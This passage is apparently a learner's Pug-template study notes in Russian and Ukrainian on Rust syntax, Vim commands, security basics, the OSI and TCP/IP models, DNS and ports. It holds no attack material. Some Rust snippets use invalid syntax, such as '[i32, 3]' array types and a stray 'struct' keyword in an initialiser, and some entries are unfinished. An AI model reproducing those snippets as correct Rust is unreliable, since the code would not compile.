                    x + y<br>
                }
              td.
                fn - ключевое слово для объявления функции; name(x: i32, y: i32) - имя функции с параметрами х и у, анотация типа параметра обязательна;<br>
                если в параметр передается переменная, которая указывает на значение в куче,<br>
                то эта переменная перемещается из своей области видимости в область видимости функции. <br>
                если в параметр передается переменная со значением в стэке, то переменная остается в своей области видимости, <br>
                а в область видимости функции передается её копия.
                -> i32 - возвращает значение типа i32, обязательно указывать если функция что-нибудь возвращает; <br>
                {} - scope, блок кода, область видимости функции; <br>
                x + y - выражение, результат которого возвращает функция
            tr
              td.
                fn never_return() -> ! { <br>
                    panic!() <br>
                }
              td.
                функция, которая никогда не вернет поток. Макрос panic!() вызовет ошибку и завершение программы. <br>
                unimplemented!() - макрос для функций, которые пока ещё не имплементированы. <br>
                todo!() - <br>
            tr
              td Option<.i32>
              td Some() None
            tr
              td Result<.Res, Err>
              td Ok() Err()
            tr
              td.
                match x {<br>
                    1 => { } <br>
                    _ => { } <br>
                }
              td 
            tr
              td let x: Box<.i32> = Box::new(5);
              td Box позволяет разместить любое значение в куче.
            tr
              td let s: Box<.str> = "hello, world".into();
              td Метод into() переводит значение, на которои его вызвали в указанный тип переменной.
            tr
              td.
                struct Person {<br>
                    name: String,
                    age: Box<.u8>, <br>
                }
              td создаёт сруктуру с полями. Так создаются новые пользовательские типы.
            tr
              td.
                let person: Person = struct Person {<br>
                    name: String::from("Alice"),<br>
                    age: Box::new(20), <br>
                };
              td инициализируем сруктуру с конкретными значенями. Переменная person имеет тип Person.
            tr
              td let Person {name, age} = person;
              td деструктуризируем переменную. Получаем переменные name и age с указателями на значения.
            tr
              td let arr = [];
              td.
                let arr: [i32, 3] = [1, 2, 3]; let arr: [i32, 10] = [1; 10]; // [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>
                arr[0], arr.get(0).unwrap();<br>
                get(0) - возвращает Option&lt;T&gt;td

    //- VIM
    details
      summary VIM
      pre.
        h  --> move left
        j  --> move down
        k  --> move up
        l  --> move right

        gg  --> Move to the first line of the page
        G   --> Move to the last line of the page
        number j -> down to number lines
        number k -> up to number lines
        :number   --> Go to the line number

        gcc  --> Comment/uncomment the current line
        gc{motion}  --> Comment/uncomment the lines covered by {motion}

        $  --> Go to the end of the line
        0  --> Go to the start of the line

        b  --> Go to the previous word
        w  --> Go to the next word
        e -> move to end of the word

        y - copy selected text
        yw - copy one word
        yy - the whole line
        x --> Delete the character under the cursor
        d --> Delete the selected text
        dw - to delete from the cursor up to the next word       d2w - repeat dw 2 times
        de - to delete from the cursor up to the end of the word d3e - repeat de 3 times
        d$ - to delete from the cursor to the end of a line
        dd - to delete a whole line                              d5d - repeat dd 5 times
        p --> Paste the previously deleted or copied text after the cursor

        i - insert before the cursor
        I - insert mode and places the cursor at the beginning of the line
        a - append after the cursor
        A - append after the line
        o - open line below cursor and place inte INSERT mode.
        O - open line above cursor and place inte INSERT mode.
        u - to undo previous actions
        U - to undo all the changes on a line
        Ctrl + r   --> Redo the undone action

        R - replace characters
        ce - to change from the cursor to the end of the word
        c$ - to change to the end of a line.
        ctrl-g - displays your location in the file and the file status.

        / - followed by a phrase to search
        n - search for the same phrase again
        N - search for the same phrase in the opposite direction
        ctrl-o - go back to where you came from
        ctrl-i - goes forward
        ? --> Start searching backward
        % - find matching characters
        To substitute new for the first old in a line type    :s/old/new
        To substitute new for all 'old's on a line type       :s/old/new/g
        To substitute phrases between two line #'s type       :#,#s/old/new/g
        To substitute all occurrences in the file type        :%s/old/new/g
        To ask for confirmation each time add 'c'             :%s/old/new/gc

        :! - run shell command
        :w filename - write content to the file
        :r filename - retrien and merge files.

        v - Visual Mode starting from the character under the cursor
        V - Visual Mode allowing selection of entire lines, starting with the current line
        ctrl+v - Visual Mode allowing selection of vertical blocks

        Ctrl + u   --> Move half a screen up
        Ctrl + d   --> Move half a screen down
        Ctrl + b   --> Move one full screen up
        Ctrl + f   --> Move one full screen down

        (  --> Jump to the beginning of the previous sentence
        )  --> Jump to the beginning of the next sentence
        {  --> Jump to the beginning of the previous paragraph
        }  --> Jump to the beginning of the next paragraph

        ]]  --> Move to the beginning of the next function
        [[  --> Move to the beginning of the previous function

        ]]  --> Move to the beginning of the next function
        [[  --> Move to the beginning of the previous function

        zf{motion}  --> Create a fold (replace {motion} with a movement command)
        zo          --> Open a fold
        zc          --> Close a fold
        zr          --> Reduce folding level throughout the file
        zm          --> Increase folding level throughout the file

    //- Теория
    details
      summary Теория
      p.
        Куб МакКамбера — это модель, созданная Джоном МакКамбером в 1991 году, чтобы помочь организациям создать и оценить инициативы по информационной безопасности, учитывая все связанные с ними факторы.<br>
        Эта модель безопасности имеет три измерения:<br>
        - Основополагающие принципы защиты информационных систем.<br>
        - Защита информации в каждом из ее возможных состояний.<br>
        - Меры предосторожности, используемые для защиты данных.<br>
        <br>
        Основные <em>принципы</em> защиты информации:<br>
        1. <dfn>Конфиденциальность</dfn> предотвращает раскрытие информации неавторизованным лицам, ресурсам или процессам.<br>
        Методы, используемые для обеспечения конфиденциальности, содержат шифрование данных, идентификацию личности и двухфакторную аутентификацию.<br>
        <br>
        2. <dfn>Целостность</dfn> обеспечивает защиту системной информации или процессов от преднамеренных или случайных изменений.<br>
        Одним из способов обеспечить целостность есть использование хэш-функции или контрольной суммы.<br>
        <br>
        3. <dfn>Доступность</dfn> означает, что авторизованные пользователи могут получить доступ к системам и данным, когда и где это необходимо, а те, которые не отвечают установленным условиям, нет.<br>
        Это может быть достигнуто за счет обслуживания оборудования, проведения ремонта аппаратного обеспечения, обновления операционных систем и программного обеспечения, и создания резервных копий.<br>
        <br>
        <em>Защита</em> информации в каждом из ее возможных состояний:<br>
        1. <dfn>Обработка</dfn> относится к состоянию данных, используемых для выполнения такой операции, как обновление записи базы данных (данные в обработке).<br>
        <br>
        2. <dfn>Хранение</dfn> определяет состояние данных, хранящихся в памяти или постоянном устройстве хранения, таком как жесткий диск, твердотельный накопитель или USB-накопитель (данные в состоянии покоя).<br>
        <br>
        3. <dfn>Передача</dfn> относится к состоянию перемещения данных между информационными системами (данные в пути).<br>
        <br>
        <em>Меры предосторожности</em>, используемые для защиты данных:<br>
        1.  <dfn>Осведомленность</dfn>, обучение и образование – это меры, предпринимаемые организацией, чтобы гарантировать, что пользователи знают о потенциальных угрозах безопасности и действиях, которые они могут принять для защиты информационных систем.<br>
        <br>
        2. <dfn>Технология</dfn> относится к программно-аппаратным решениям, разработанным для защиты информационных систем, таких как брандмауэры, постоянно контролирующие вашу сеть в поисках возможных вредных инцидентов.<br>
        <br>
        3. <dfn>Политика и процедуры</dfn> относятся к административным средствам контроля, которые обеспечивают основу для того, как организация реализует информационную безопасность, например, планы реагирования на инциденты и рекомендации по наилучшим практикам.<br>

        четыре основные характеристики сети:
        - отказоустойчивость,
        - масштабируемость,
        - качество обслуживания (QoS),
        - безопасность.

        Отказоустойчивость достигаеться вариантами машрутов.
        Наличие нескольких путей к пункту назначения
        известно как избыточность или резервирование (redundancy).

        Масштабируемость позволяет добавлять новых пользователей.

        Согласно политике QoS маршрутизатор может управлять потоками данных и голоса,
        предпочитая голосовое соединение при возникновении перегрузки в сети.
        Целью QoS является установка приоритетов для чувствительного к времени трафика.
        Важен тип трафика, а не его содержание.

        Администраторы сети также должны защищать информацию, передаваемую в пакетах по сети,
        а также хранящуюся на подключенных к сети устройствах.
        Достичь целей безопасности сети можно при соблюдении трех основных требований.

        Конфиденциальность – конфиденциальность данных означает,
        что только уполномоченные и авторизованные пользователи могут получать доступ к данным.

        Целостность - целостность данных гарантирует пользователям,
        что информация не была изменена во время передачи от источника к получателю.

        Доступность - доступность данных гарантирует авторизованным пользователям
        своевременный и надежный доступ к сервисам данных.

        Управление IP-трафиком основано на характеристиках и устройствах,
        связанных с каждым из трех уровней иерархической модели проектирования сети: доступа,
        распределения и ядра.

        Администраторы сети должны решать два типа безопасности:
        безопасность сетевой инфраструктуры и защиту информации.

        Администраторы сети также должны защищать информацию, 
        передаваемую в пакетах по сети, а также хранящуюся на подключенных к сети устройствах.
        Есть три основных требования для достижения целей безопасности сети:
        конфиденциальность, целостность и доступность.

        Типы киберугроз:

        Программные атаки (Software attacks)
        - Успешный отказ в обслуживании (DoS Attack).
        - Компьютерный вирус.

        Программные ошибки (Software errors)
        - Ошибка программного обеспечения.
        - Переход приложения в автономный режим.
        - Межсайтовый скрипт или предоставление нелегального доступа к ресурсам файлового сервера.

        Саботаж (Sabotage)
        - Авторизированный легальный пользователь выполняет успешное проникновение и компрометацию базы данных организации.
        - Искажение страниц веб-сайта организации.

        Человеческая ошибка (Human error)
        - Неумышленные ошибки при вводе данных.
        - Некорректные настройки межсетевого экрана.

        Кража (Theft)
        - Кража ноутбуков или оборудования из незапертой комнаты.

        Отказ оборудования (Hardware failures)
        - Выходы из строя жестких дисков.

        Сбои в предоставлении услуг (Utility interruption)
        - Отключение электроэнергии.
        - Повреждения, вызванные из-за попадания воды из неисправного разбрызгивателя.

        Стихийные бедствия (Natural disasters)
        - Мощные штормы, такие как ураганы или торнадо.
        - Землетрясения.
        - Наводнения.
        - Пожар.

        Организациям необходимо инвестировать в улучшенные методы безопасности:<br>
        - инвестирование в обучение по кибербезопасности для всего персонала, чтобы они были осведомлены и могли заметить кибератаку<br>
        - обеспечение двухфакторной аутентификации для сотрудников, получающих доступ к файлам и программам, содержащим конфиденциальные данные<br>
        - ведение файлов журналов и постоянный мониторинг для выявления аномального поведения, которое может свидетельствовать о нарушении безопасности<br>
        - хранение паролей клиентов с помощью комбинации засолки и надежных алгоритмов хеширования<br>
        - отделение облачных ресурсов от общедоступного Интернета в изолированный сегмент частной сети<br>
        - предоставление доступа сотрудников к персональным данным и внутренним системам только через защищенное VPN-соединение<br>
        <br>
        Некоторые полезные советы, которые помогут вам создать имя пользователя:<br>
        - Не используйте полное имя или часть адреса или номера телефона.<br>
        - Не используйте имя пользователя электронной почты.<br>
        - Не используйте одинаковое сочетание имени пользователя и пароля, особенно для финансовых аккаунтов.<br>
        - Не выбирайте имя пользователя, а затем не используйте его снова и снова – это облегчает отслеживание.<br>
        - Не выбирайте имя пользователя, которое дает подсказки к вашим паролям, например ряд цифр/букв или первую часть фразы, состоящую из двух частей, например стук-стук или звезда, или отдел, в котором вы работаете, например IT.<br>
        - Выберите имя пользователя, которое подходит для типа учетной записи, т.е. деловой, социальной или личной.<br>
        <br>
        Шифруйте все конфиденциальные данные компании, включая электронную почту.<br>
        Программное обеспечение обновляется с целью поддержания его актуального состояния и предотвращения использования уязвимостей.<br>
        <br>
        Знание и понимание ценности того, что вы защищаете поможет оправдать затраты на безопасность.<br>
        Создайте политику, четко определяющую правила организации, должностные роли, а также ответственность и ожидания для сотрудников.<br>
        Меры физической безопасности – ограничьте доступ к коммуникационным шкафам, серверным комнатам, а также к системам пожаротушения.<br>
        Необходимо провести проверку данных всех сотрудников.<br>
        Выполните регулярное резервное копирование и тестирование восстановления данных из резервных копий.<br>
        Регулярно обновляйте операционные системы и приложения сервера, клиента и сетевого устройства.<br>
        Настройте роли и уровни привилегий пользователей, а также надежную аутентификацию.<br>
        Используйте команду реагирования на инциденты и проверяйте сценарии реагирования на чрезвычайные ситуации.<br>
        Выберите решение для мониторинга безопасности, которое интегрируется с другими технологиями.<br>
        Используйте маршрутизаторы, межсетевые экраны и другие устройства безопасности нового поколения.<br>
        Используйте антивредоносное и антивирусное программное обеспечение корпоративного уровня.<br>
        <dfn>NetFlow</dfn> – важная технология для выявления кибератак, базирующаяся на анализе поведения.<br>
        Коммутаторы, маршрутизаторы и межсетевые экраны, оснащенные NetFlow, могут сообщать информацию о входе, выходе и транзите данных в сети.<br>

        Облачные услуги включают:
        SaaS – Программное обеспечение как услуга
        PaaS – Платформа как услуга
        IaaS - Инфраструктура как услуга

        Существует четыре основные облачные модели:
        Публичные облака - облачные приложения и услуги, предлагаемые в общедоступном облаке,
        доступны для широкой общественности.

        Частные облака – облачные приложения и сервисы, предлагаемые в частном облаке,
        предназначенные для определенной организации или, например, правительства.

        Гибридные облака – состоят из двух или более разных типов облаков,
        где каждая часть остается отдельным объектом, но обе связаны с помощью одной архитектуры.
        Облака сообщества - облака, созданные для эксклюзивного использования определенными сообществами.

        Виртуализация - это основа для облачных вычислений.
        Без виртуализации облачные вычисления в том виде, в каком они наиболее широко внедряются,
        были бы невозможны.

        Гипервизор — это программа, микропрограмма или аппаратное обеспечение,
        добавляющее уровень абстракции поверх физического оборудования.

        Гипервизоры типа 1 выполняются на голом железе,
        поскольку гипервизор устанавливается непосредственно на аппаратное обеспечение.
        Такие гипервизоры обычно используются на корпоративных серверах
        и сетевых устройствах центров обработки данных.

        Гипервизор типа 2 — это программное обеспечение,
        создающее и запускающее экземпляры виртуальной машины.
        Компьютер, на котором гипервизор поддерживает одну или несколько виртуальных машин,
        является узловой машиной – хостом.

    //- OSI
    details
      summary OSI
      p.
        OSI - эталоная модель
        <dfn>Модель взаимодействия открытых систем</dfn> (Open Systems Interconnection, OSI): <br>
        - эталонная модель организации компьютерных сетей, <br>
        - юридический стандарт организации ISO, <br>
        - 7 уровней организации сети и их назначение, <br>
        - протоколы не включены в модель, <br>
        - не используется на практике, <br>
        удобна для описания компьютерных сетей.<br>
      table
        caption Уровни OSI
        tr
          th Уровень
          th Единица
          th Оборудование
        tr
          td Прикладной
          td Сообщение
          td На хосте
        tr
          td Представления
          td Сообщение
          td На хосте
        tr
          td Сеансовый
          td Сообщение
          td На хосте
        tr
          td Транспортный
          td Сегмент/Дейтаграмма
          td На хосте
        tr
          td Сетевой
          td Пакет
          td Маршрутизатор
        tr
          td Канальный
          td Кадр
          td Коммутатор, точка доступа Wi-Fi
        tr
          td Физический
          td Бит
          td Концентратор, репитор
      br
      p.
        <dfn>Физический уровень</dfn> - основная задача это передача битов по физическому каналу связи, т.е. перевод битов в сигнали и обратно. Бит - 0 или 1. <br>
        Сигналы передаются по: <br>
        - перепады напряжения для меди, <br>
        - импульсы для оптоволокна, <br>
        - электромагнитное излучение для радиосвязи. <br>
        <br>        
        Передача потока бит по среде передачи данных: <br>
        - не вникает в смысл передаваемой информации, <br>
        - единица передачи информации - бит (...01100111001...) <br>
        <br>
        <dfn>Задача физического уровня</dfn> - представить биты информации в виде сигналов, передаваемых по среде. <br>
        <br>
        <dfn>Характеристики канала связи</dfn>:<br>
        Скорость канала: <br>
        - Пропускная способность (бит/с) - количество передачи данных за еденицу времени. <br>
        - Задержка - сколько времени пройдёт пока сообщение от отправителя дойдёт до получателя.<br>
        Количество ошибок - если возникают часто, то сетевое оборудование должно иметь инструменты их исправления, если редко, то ошибки можно исправлять на более высоких уровнях.<br>
        <br>
        <dfn>Типы каналов связи</dfn>:<br>
        - Симплексный - пердача только в одну сторону.<br>
        - Дуплексный - передача данных в обе стороны одновременно.<br>
        - Полудуплексный - передача данных в обе стороны по очереди.<br>
        <br>
        <em>Кабель - ошибки редко:</em> <br>
        Витая пара - скрученные для уменьшения помех медные кабели. <br>
        Оптический кабель - тонкие световоды объединяються в один кабель.<br>
        <br>
        <em>Беспроводные технологии - ошибки часто:</em><br>
        Радиоволны - GSM 900 МГц лицензируется, Wi-Fi 2,4 ГГц и 5 ГГц без лицензий.<br>
        <br>
        <em>Спутниковые каналы.</em>
        <br>
        <em>Представление информации:</em> <br>
        Медные провода - кодирование - прямоугольные импульсы. <br>
        Оптоволокно, беспроводная среда - модуляция - синусоидальные волны.<br>        
        <br>
        <dfn>Канальный уровень</dfn>:<br>
        - определяет начало/конец сообщения в потоке бит, <br>
        - обноруживает и исправляет ошибки, <br>
        - управляет доступом к среде передачи данных (одномоментно передаёт только один.), <br>
        - физическая адресация (МАС). <br>
      img(src="./img/web/chenel.jpg" alt="")
      img(src="./img/web/chenel_.jpg" alt="")
      img(src="./img/web/MAC.jpg" alt="")
      br
      p.
        <dfn>Сетевой уровень</dfn>: <br>
        - создание составной сети и согласование различий в сетях, <br>
        - адресация (сетевые и глобальные адреса), <br>
        - определение маршрута пересылкипакетов в составной сети (маршрутизация), <br>
        <br>
        <dfn>Транспортный уровень</dfn>: <br>
        - передача данных между процессами на хостах, <br>
        - управляет надёжностью (защищённый от ошибок канал с гарантированным порядком следованиясообщеницй), <br>
        - сквозной уровень от отправителя к получателю. <br>
        <br>
        <dfn>Сеансовый уровень</dfn>: <br>
        - создаёт сеансы связи, <br>
        - управляет диалогом (очерёдностью передачи сообщений), <br>
        - управляет маркерами (недопускает одновременно выполнять критические операции), <br>
        - синхронизация (метки в сообщениях для возобновления передачи в случае сбоя связи), <br>
        - на практике сеансовый уровень в сетях не используется. <br>
        <br>
        <dfn>Уровень представления</dfn>: <br>
        - согласование форматов представления символов и чисел, <br>
        - шифрование и дешифрование. <br>
        <br>
        <dfn>Прикладной уровень - приложения</dfn>: <br>
        - web-страницы, <br>
        - соц.сети, <br>
        - видео и аудио связь <br>
        - почта, <br>
        - доступ к файлам и т.д.<br>
      img(src="./img/web/OSI_.png" alt="")
      img(src="./img/web/OSI__.png" alt="")
      img(src="./img/web/OSI.jpg" alt="")
      a(href="https://kr-labs.com.ua/blog/model-osi/") osi   <br>

    //- TCP/IP
    details
      summary TCP/IP
      img(src="./img/web/TCP_IP.jpg" alt="")
      p.
        <dfn>TCP/IP</dfn> - произошло от TCP и IP. <br>
        Набор правил, который позволяет обрабатывать сквозную передачу данных. <br>
        Сюда входит: формирование пакетов, способ их отправки, получения, маршрутизации, распаковки для передачи программному обеспечению. 
        
        TCP/IP - модель протокола
        TCP/IP              Протоколы в заголовках сообщений
        Application     -   HTTP (передача данных в формате HTML)
        Transport       -   TCP (на каком порту работает приложение, контроль доставки)
        Internet        -   IP (находжение устройства по ip-адресу)
        Network access  -   Ethernet (общение между сетевыми картами в одной сети)

        TCP/IP              Задачи
        Application     -   Отображение пользователю, кодирование, шифрование, управление сеансами
        Transport       -   Установка соединения между устройствами в разных сетях.
        Internet        -   Межсетевой маршрут от отправителя к полячателю.
        Network access  -   Управление устройствами внутри сети.



      //- Internet
      details
        summary Internet
        p.
          <dfn>Интернет</dfn> (англ. Internet) — всемирная система объединённых компьютерных сетей для хранения, обработки и передачи информации. <br>
          Сеть сетей, которая объединяет в себе компьютеры, маршрутизаторы и сервера.<br>
          Очень большая сеть компьютеров, которые взаимодействую друг с другом.<br>
          Интернет - это инфраструктура, а ВЭБ - это сервис, построенный на основе этой инфраструктуры.<br>
          <br>
          <dfn>Всемирная паутина</dfn> (англ. World Wide Web) — распределённая система, предоставляющая доступ к связанным между собой документам, расположенным на различных компьютерах, подключённых к сети Интернет<br>
          <br>
          <dfn>Веб-служба, веб-сервис</dfn> (англ. web service) — идентифицируемая уникальным веб-адресом (URL-адресом) программная система со стандартизированными интерфейсами, а также HTML-документ сайта, отображаемый браузером пользователя<br>

      //- URI
      details
        summary URI
        p.
          <dfn>URI</dfn> - Унифицированный идентификатор ресурса<br>
          URI включают в себя как URL, URN, так и другие способы указания ресурса.<br>
          <dfn>URI данных</dfn> - это не URL или URN, потому что содержит данные.<br>
          Он не называет ресурс и не указывает, как его найти по сети.<br>
          Примером URI, который не является ни URL-адресом, ни URN, будет URI данных, например:
        code data:Hello%20World
        p.
          <dfn>URL</dfn> (Uniform Resource Locator — унифицированный указатель ресурса) - адрес, который выдан уникальному ресурсу в интернете. <br>
          В теории, каждый корректный url ведёт на уникальный ресурс. <br>
          Такими ресурсами могут быть html-страница, css-файл, изображение и т.д <br>
          <br>
          <dfn>URN</dfn> (Uniform Resource Name) является уникальным именем объекта. <br>
          URN включает в себя название пространства имен и идентификатора в этом пространстве. <br>
          <br>
          Существуют также единые ссылки ресурсов (URC), которые указывают на метаданные о документе, а не на сам документ. <br>
          <dfn>URC</dfn> - это другой тип URI, который не является ни URL, ни URN.<br>
          Примером URC будет индикатор для просмотра исходного кода веб-страницы:
        code>view-source:http://example.com/
        br
        img(src="./img/web/uri.png" alt="")
        img(src="./img/web/URL.png" alt="")

      //- DNS
      details
        summary DNS      
        p.
          <dfn>Домен</dfn> (доменное имя) – это псевдоним для IP-адреса понятный для человека, состоящий из набора символов и цифр. <br>
          Каждое доменное имя в Интернете является уникальным. <br>
          Максимальная длина доменного имени (между точками) – 63 символа. <br>
          Общая длина имени, включая поддомены, разделительные точки и имя зоны домена, может составлять до 255 знаков.<br>
        img(src="./img/web/domain.png" alt="")
        img(src="./img/web/domains.png" alt="")
        br
        p.
          <dfn>DNS</dfn> (англ. Domain Name System — система доменных имён) — компьютерная распределённая система для получения информации о доменах. <br>
          Чаще всего используется для получения IP-адреса по имени хоста (компьютера или устройства). <br>
          DNS - это распределённая база данных, которая сопоставляет доменные имена с IP-адресами. <br>
          Когда пользователь вводит доменное имя в браузере, браузер отправляет DNS - запрос на DNS-сервер для преобразования доменного имени в IP-адрес. DNS-сервер прослушивает порт 53. <br>
          Система адресов интернета имеет иерархическую структуру: <br>
          - домены уровня страны (.us) <br>
          - домены верхнего уровня (.com) <br>
          - поддомены.<br>
        img(src="./img/web/dns.png" alt="")
        img(src="./img/web/DNS.png" alt="")

      //- ISP
      details
        summary ISP
        p.
          <dfn>Интернет-прова́йдер</dfn> (иногда просто провайдер; от англ. internet service provider, сокр. ISP — поставщик интернет-услуги) — организация, предоставляющая услуги доступа к сети Интернет и иные связанные с Интернетом услуги.<br>
          <br>    
          <dfn>Хостинг</dfn> (англ. hosting) — услуга по предоставлению ресурсов для размещения информации на сервере, постоянно находящемся в сети (обычно Интернет). <br>
          Это комбинация программных и аппаратных технологий, позволяющая разместить в интернете сайт, приложение, базу данных и их составные компоненты, требующие постоянного нахождения в онлайне. <br>
          <br>
          Два основных термина: хостинг-сервер и хостинг-провайдер. <br>
          <dfn>Сервер</dfn> - компьютер, на котором храняться файлы сайта или приложения. Работает 24/7. <br>
          <dfn>Хостинг-провайдер</dfn> - компания, обслуживающая сервер и создающая ПО для него. <br>
          Процессор, оперативная память и дисковое пространство сервера передаются клиенту в пользование за плату.<br>

      //- Браузер
      details
        summary Браузер
        p.
          <dfn>Браузер</dfn> - это программа, которая позволяет искать информацию в интернете, просматривать сайты, скачивать и загружать файлы. Это среднее звено между пользователем и интернетом.<br>
          Пользователь вводит в адресную строку браузера адрес сайта.<br>
          Браузер ищет сервер по IP-адресу. Сервер - это программа.<br>
          Сначала он ищет в кэше роутера, операционной системе или в истoрии подключений.<br>
          Потом смотрит в DNS.<br>
          Найдя нужный IP-адрес, браузер устанавливает соединение с сервером с помощью протокола TCP/IP.<br>
          Для установки соединения используется процесс "<dfn>рукопожатие</dfn>" (handshaking)<br>
          Браузер отправляет HTTP запрос на сервер для отображения страницы.<br>
          Запрос обрабатывается вэб-сервером.<br>
          После этого сервер отправляет браузеру ответ с данными:<br>
          - файлы cookie<br>
          - способ кэширования<br>
          - контент страницы<br>
          Браузер обрабатывает ответ и отображает запрашиваемый контент (рендеринг).
          
      //- Ethernet
      details
        summary Ethernet
        img(src="./img/web/Ethernet.jpg" alt="")
        img(src="./img/web/CSMA.jpg" alt="")
        img(src="./img/web/ICMP.png" alt="")
        p.
          После преамбулы все компьютеры в сети начинают записывать передаваемый кадр в свой буфер.<br>
          Первые 6 байт кадра содержат адрес получателя: <br>
          - компьютер, который узнал свой адрес, продолжает записывать кадр, <br>
          - остальные удаляют кадр из буфера. <br>
          <br>
          Для диагностики сети удобно использовать Promiscuous mode (неразборчивый режим работы стевого адаптера) - адаптер принимает все кадры в сети, не зависимо от МАС-адреса получателя. <br>
          <br>
          Недостатки классического Ethernet: <br>
          <em>Плохая масштабируемость</em>: <br>
          - сеть становиться неработоспособной при загрузки разделяемой среды больше чем на 30%, <br>
          - работоспособное количество компьютеров - 30. <br>
          <br>
          <em>Низкая безопасность</em> - данные в разделяемой среде доступны всем. <br>
          <em>Разное время доставки кадра</em>: <br>
          - причина - коллизии, <br>
          - плохо для трафика реального времени (аудиозвонок, видеоконференция). <br>
          <br>
          В распределяемой среде возможны коллизии. <br>
          В коммутируемом Ethernet соединение Точка-Точка без разделяемой среды.<br>
        img(src="./img/web/net1.jpg" alt="")
        img(src="./img/web/net2.jpg" alt="")
        img(src="./img/web/Firewall.png" alt="")
        img(src="./img/web/Proxy.png" alt="")
        img(src="./img/web/ReverseProxy.png" alt="")
        img(src="./img/web/ReverseProxy_.png" alt="")
        img(src="./img/web/VLAN.png" alt="")
        img(src="./img/web/VPN.png" alt="")
        img(src="./img/web/VPN_.png" alt="")

      //- Protocol
      details
        summary Protocol
        p.
          <dfn>Протокол</dfn> — документ, фиксирующий какое-либо событие, факт или договоренность.<br>
          Веб-протокол, також відомий як протокол передачі даних, являє собою своєрідний набір правил, що описують послідовність, особливості взаємодії двох або більше пристроїв, підключених до однієї мережі та здійснюючих зв'язок.
          Протоколы:
          IPv4, IPv6,
          ICMP, ICMPv6,
          DHCP, DHCPv6.
          TCP, UDP,
          HTTP, HTTPS
          DNS, SSH
          WLAN, Ethernet

          Характеристики протокола:
          Формат сообщения - зависит от типа сообщения и канала передачи.
          Розмер сообщения - зависит от канала передачи.
          Синхронизация - определяет в какой очередности и с какой скоростью узлы будут отправлять сообщения.
          Кодирование - биты кодируются отправителем в виде световых, электрических или электромагнитных импульсов,
                      взависимости от среды передачи сигнала. Получатель эти импульсы декодирует в биты.
          Инкапсуляция - добавление к фрагменту сообщения заголовка с данными об отправиле и получете.
          Шаблон сообщения - требуется ли подтверждение о получении сообщения перед отправкой следующего или нет.

          DHCP/ICMPv6 - Ethernet/WLAN - IP address, network, gateway, DNS server.

          Стандарты:
          IEEE, IETF (RFC), IANA, ICANN, ITU, TIA.
        
        a(href="https://hyperhost.ua/info/uk/osnovni-protokoli-merezhi-navishcho-voni-vikoristovuyutsya") protokoli   <br>
        a(href="https://deltahost.ua/ua/tipi-merezhevix-protokoliv-i-ih-priznachennya-http-ip-ssh-ftp-pop3-mac.html") protokoli <br>
        img(src="./img/web/Protocol.png" alt="")
        img(src="./img/web/ProtocolCode.png" alt="")
        img(src="./img/web/ProtocolWeb.png" alt="")

        //- IP & Port
        details
          summary IP & Port
          p.
            <dfn>Internet Protocol</dfn> (IP, досл. «межсетевой протокол») - маршрутизируемый протокол сетевого уровня стека TCP/IP. <br>
            Именно IP стал тем протоколом, который объединил отдельные компьютерные сети во всемирную сеть Интернет. <br>
            Неотъемлемой частью протокола является адресация сети - IP-адрес. <br>
            <dfn>IP-адрес</dfn> — уникальный сетевой адрес узла в компьютерной сети, построенной на основе стека протоколов TCP/IP. <br>
            В сети Интернет требуется глобальная уникальность адреса, в случае работы в локальной сети требуется уникальность адреса в пределах сети. <br>
            Чтобы обратиться к какому-то компьютеру, каждый компьютер, подключенный к сети, имеет свой уникальный адрес - IP-адрес. <br>
            Каждый компьютер, подключенный к интернету, может быть доступен через публичный IP-адрес, который состоит из 32 бит для IPv4 <br>
            (такие адреса обычно записываються в виде четырёх чисел от 0 до 255, разделённых точками: 173.194.121.32) <br>
            или 128 бит для IPv6 <br>
            (обычно записываются в виде 8 групп по 4 шестнадцатиричных чисела, разделённых двоеточиями: 2027:0da8:8b73:0000:0000:8a2e:0370:1337)
                    ICANN (Internet Corporation for Assigned Names and Numbers)
            «Корпорация по управлению доменными именами и IP-адресами».

            Service Name and Transport Protocol Port Number Registry:
            https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml


            Сокет - комбинация исходного IP-а   дреса и номера порта источника,
            или IP-адреса и номера порта назначения.
            192.168.1.5:1099 - сокет источника
            192.168.1.7:80 - сокет веб сервера

            Netstat – это сетевая утилита, которая может использоваться для проверки соединений.
            Параметр -n  - отображение IP-адресов и номеров портов в числовом виде.

            Порты назначаются и управляются организацией, известной как ICANN.
            Порты делятся на три категории и имеют число от 1 до 65535:

            Хорошо известные порты – порты назначения, связанные с общими сетевыми программами,
            идентифицируются как хорошо известные порты. Эти порты находятся в диапазоне от 1 до 1023.

            Зарегистрированные порты – порты от 1024 до 49151 можно использовать в качестве портов источника или назначения.
            Они могут быть использованы организациями для регистрации конкретных приложений, таких как программы чата.

            Частные порты – порты от 49 152 до 65 535, которые часто используются как порты источника.
            Эти порты могут использоваться любыми приложениями.

            nslookup - найти IP-адрес для любого доменного имени.


            ipconfig – перегляд інформації про IP-конфігурацію.
            ping     – перевірка з'єднань з іншими IP-хостами.
            netstat  – перегляд мережних з'єднань.
            tracert  – перегляд маршруту до місця призначення.
            nslookup – запит інформації про домен отримувача безпосередньо з серверу доменних імен.

            Команда ipconfig /all предназначена для просмотра расширенной информации,
            включая MAC-адреса, IP-адреса шлюза по умолчанию и DNS-серверы.
            Также указывается, включен ли протокол DHCP и выводятся данные адреса DHCP-сервера и информация об аренде.

            Если используется динамическое назначение IP-адресов,
            команда ipconfig /release удаляет существующие привязки адресов DHCP. 
            Команда ipconfig /renew запрашивает текущую конфигурацию с DHCP-сервера.
            Хост может содержать ошибочную или устаревшую информацию о конфигурации IP,
            и простое обновление этой информации – это все, что нужно для восстановления соединения.
          img(src="./img/web/Port.png" alt="")
          img(src="./img/web/Ports.pdf" alt="")              
        
        //- TCP
        details
          summary TCP
          p.
            <dfn>TCP</dfn> - Transmission Control Protocol - протокол управления передачей <br>
            Обмен данными, ориентированный на соединения, может использовать надежную связь, для обеспечения которой
            протокол уровня 4 (транспортный) посылает подтверждения о полученных данных и запрашивает повторную передачу, если данные не получены
            или искажены. <br>
            Пакеты в TCP называются сегментами. <br>
            TCP используется в прикладных протоколах HTTP, FTP, SMTP, Telnet. <br>
            Перед отправкой сообщения по протоколу TCP соединение должно быть открыто. <br>
            Механизм TCP предоставляет поток данных с предварительной установкой соединения, осуществляет повторный запрос данных в случае потери данных и устраняет дублирование при получении двух копий одного пакета.<br>
